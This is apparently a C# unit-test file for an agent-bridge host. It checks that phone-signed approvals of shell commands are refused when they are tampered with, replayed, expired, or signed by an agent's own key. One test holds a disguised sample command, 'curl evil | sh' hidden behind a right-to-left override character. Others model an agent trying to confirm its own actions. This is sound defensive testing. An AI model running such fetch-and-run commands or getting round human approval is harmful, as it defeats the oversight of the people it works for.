using System.Text.Json;
using AgentBridge.Host;
using AgentBridge.Protocol;
using AgentBridge.Transport;
using Xunit;

// Approve on an approval the host escaped anything in (#803): the confirmation a person's device
// signs, as the host takes it from the relay. Each refusal is one way an agent, a stale press or
// another machine could otherwise ride a confirmation.
public sealed class EscapedApprovalTests : IDisposable
{
    const string Session = "c0b11070-0000-4000-8000-0000000000aa";
    readonly P256KeyPair machine = P256KeyPair.Generate();
    readonly P256KeyPair phone = P256KeyPair.Generate();
    readonly List<PresenceEntry> present = [];
    List<string> approved;
    readonly Question question;

    public EscapedApprovalTests()
    {
        approved = [Wire.DeviceId(phone.Public)];
        present.Add(new PresenceEntry(Wire.DeviceId(phone.Public), "Phone", "pwa", DateTimeOffset.UtcNow));
        const string message = "Allow **shell**?\n\n```\necho \\u202E safe\n```";
        question = new Question
        {
            Id = "r1#0011223344556677",
            Kind = QuestionKind.Approval,
            Message = message,
            AskedAt = DateTimeOffset.UnixEpoch,
            Escaped = EscapedApproval.For(message, [(27, 6)], EscapedApproval.Confirm),
        };
    }

    public void Dispose()
    {
        machine.Dispose();
        phone.Dispose();
    }

    string Phone => Wire.DeviceId(phone.Public);

    EscapedApprovals Approvals(string policy = EscapedApproval.Confirm)
    {
        var a = new EscapedApprovals(machine, policy, () => approved);
        a.AttachPresence(() => present);
        return a;
    }

    SignedCommand Sign(string request, P256KeyPair? signer = null, string action = EscapedApproval.Action, string? questionId = null, string? shown = null,
        string? session = null, byte[]? forMachine = null, TimeSpan? lifetime = null, DateTimeOffset? issued = null)
    {
        var at = issued ?? DateTimeOffset.UtcNow;
        var key = signer ?? phone;
        var target = forMachine ?? machine.Public;
        return SignedCommands.Sign(key, target, new CommandBody
        {
            V = 1,
            Action = action,
            Request = request,
            Principal = new CommandPrincipal { Kind = "user", Device = Wire.DeviceId(key.Public) },
            Target = new CommandTarget { Machine = Wire.DeviceId(target), Session = session ?? Session, Question = questionId ?? question.Id, Shown = shown ?? question.Escaped!.Shown },
            To = Wire.DeviceId(target),
            IssuedAt = at.ToUnixTimeSeconds(),
            ExpiresAt = at.Add(lifetime ?? TimeSpan.FromMinutes(5)).ToUnixTimeSeconds(),
        });
    }

    static AnswerRequest Approve(string request, SignedCommand confirm) => new()
    {
        Id = Session,
        Question = "r1#0011223344556677",
        Request = request,
        Fields = new Dictionary<string, JsonElement> { ["decision"] = JsonSerializer.SerializeToElement("approve") },
        Confirm = confirm,
    };

    string? Check(AnswerRequest request, string? peer = null, EscapedApprovals? approvals = null, Question? asked = null) =>
        (approvals ?? Approvals()).For(peer ?? Phone, request)!.Check(asked ?? question);

    [Fact]
    public void A_confirmation_the_approved_phone_signed_for_this_question_as_read_holds()
    {
        var request = Guid.NewGuid().ToString();
        Assert.Null(Check(Approve(request, Sign(request))));
        Assert.True(Approvals().Offers(Phone));
    }

    [Fact]
    public void A_phone_inherited_from_folder_trust_confirms_only_while_folder_trust_is_on()
    {
        // A phone listed for folder trust, then folder trust turned off (the phone lost, say): the
        // list is kept, and hidden in Settings, but confirms nothing until folder trust is on again.
        var folderTrust = true;
        var approvals = new EscapedApprovals(machine, EscapedApproval.Confirm, EscapedApprovals.Devices(null, () => folderTrust, () => approved));
        approvals.AttachPresence(() => present);
        var request = Guid.NewGuid().ToString();
        var confirm = Approve(request, Sign(request));
        Assert.Null(Check(confirm, approvals: approvals));

        folderTrust = false;
        Assert.Contains("is not approved at this machine", Check(confirm, approvals: approvals));
        Assert.False(approvals.Offers(Phone));

        // A list of its own is the machine's word either way, an empty one included.
        var listed = new EscapedApprovals(machine, EscapedApproval.Confirm, EscapedApprovals.Devices([Phone], () => false, () => []));
        listed.AttachPresence(() => present);
        Assert.Null(Check(confirm, approvals: listed));
        var none = new EscapedApprovals(machine, EscapedApproval.Confirm, EscapedApprovals.Devices([], () => true, () => approved));
        none.AttachPresence(() => present);
        Assert.Contains("is not approved at this machine", Check(confirm, approvals: none));
    }

    [Fact]
    public void An_answer_with_no_confirmation_carries_none_to_check()
    {
        Assert.Null(Approvals().For(Phone, Approve(Guid.NewGuid().ToString(), null!) with { Confirm = null }));
    }

    [Fact]
    public void A_command_changed_since_it_was_read_is_not_approved_by_the_old_confirmation()
    {
        var request = Guid.NewGuid().ToString();
        var confirm = Approve(request, Sign(request));
        const string changed = "Allow **shell**?\n\n```\necho \\u202E curl evil | sh\n```";
        var now = question with { Message = changed, Escaped = EscapedApproval.For(changed, [(27, 6)], EscapedApproval.Confirm) };
        Assert.Contains("reads differently", Check(confirm, asked: now));
        // Nor one that names the digest the host says, while the text is not what that digest is of.
        Assert.Contains("reads differently", Check(confirm, asked: question with { Message = changed }));
    }

    [Fact]
    public void A_confirmation_for_another_question_session_or_answer_is_refused()
    {
        var request = Guid.NewGuid().ToString();
        Assert.Contains("another question", Check(Approve(request, Sign(request, questionId: "r2#0011223344556677"))));
        Assert.Contains("another session", Check(Approve(request, Sign(request, session: Guid.NewGuid().ToString()))));
        // One press is one answer: a confirmation re-used for a second press names the first's request.
        Assert.Contains("another answer", Check(Approve(Guid.NewGuid().ToString(), Sign(request))));
    }

    [Fact]
    public void A_command_signed_for_anything_else_or_for_another_machine_is_refused()
    {
        var request = Guid.NewGuid().ToString();
        Assert.Contains("is for launch.trust:trust", Check(Approve(request, Sign(request, action: TrustProtocol.Action("trust")))));
        using var other = P256KeyPair.Generate();
        Assert.Contains("not signed for this machine", Check(Approve(request, Sign(request, forMachine: other.Public))));
    }

    [Fact]
    public void A_confirmation_lasting_over_five_minutes_or_expired_is_refused()
    {
        var request = Guid.NewGuid().ToString();
        Assert.Contains("at most 5 minutes", Check(Approve(request, Sign(request, lifetime: TimeSpan.FromMinutes(9)))));
        Assert.Contains("expired", Check(Approve(request, Sign(request, issued: DateTimeOffset.UtcNow.AddMinutes(-6)))));
    }

    [Fact]
    public void An_agent_cannot_confirm_from_a_key_of_its_own_or_through_another_device()
    {
        var request = Guid.NewGuid().ToString();
        // Its own key, connected as "pwa": the relay's kind is what a device says it is.
        using var agent = P256KeyPair.Generate();
        present.Add(new PresenceEntry(Wire.DeviceId(agent.Public), "Agent", "pwa", DateTimeOffset.UtcNow));
        Assert.Contains("not approved at this machine", Check(Approve(request, Sign(request, signer: agent)), peer: Wire.DeviceId(agent.Public)));
        // The phone's command carried by another device's channel, even one approved here.
        approved.Add(Wire.DeviceId(agent.Public));
        Assert.Contains("must come from the device that signed it", Check(Approve(request, Sign(request)), peer: Wire.DeviceId(agent.Public)));
        // A machine of the account, listed or not.
        present[^1] = present[^1] with { Kind = "host" };
        Assert.Contains("person's phone, browser or Windows app", Check(Approve(request, Sign(request, signer: agent)), peer: Wire.DeviceId(agent.Public)));
    }

    [Fact]
    public void The_phone_gone_from_the_relay_or_from_the_approved_devices_confirms_nothing()
    {
        var request = Guid.NewGuid().ToString();
        var confirm = Approve(request, Sign(request));
        present.Clear();
        Assert.Contains("not connected to the relay now", Check(confirm));
        present.Add(new PresenceEntry(Phone, "Phone", "pwa", DateTimeOffset.UtcNow));
        approved = [];
        Assert.Contains("not approved at this machine", Check(confirm));
        Assert.False(Approvals().Offers(Phone));
    }

    [Fact]
    public void A_machine_that_takes_these_only_at_the_machine_confirms_none_and_offers_none()
    {
        var request = Guid.NewGuid().ToString();
        var approvals = Approvals(EscapedApproval.Machine);
        Assert.Contains("only at the machine", Check(Approve(request, Sign(request)), approvals: approvals));
        Assert.False(approvals.Offers(Phone));
    }

    [Fact]
    public void Off_the_relay_nothing_is_confirmed()
    {
        var request = Guid.NewGuid().ToString();
        var approvals = new EscapedApprovals(machine, EscapedApproval.Confirm, () => approved);
        Assert.Contains("not connected to the relay", approvals.For(Phone, Approve(request, Sign(request)))!.Check(question));
    }
}
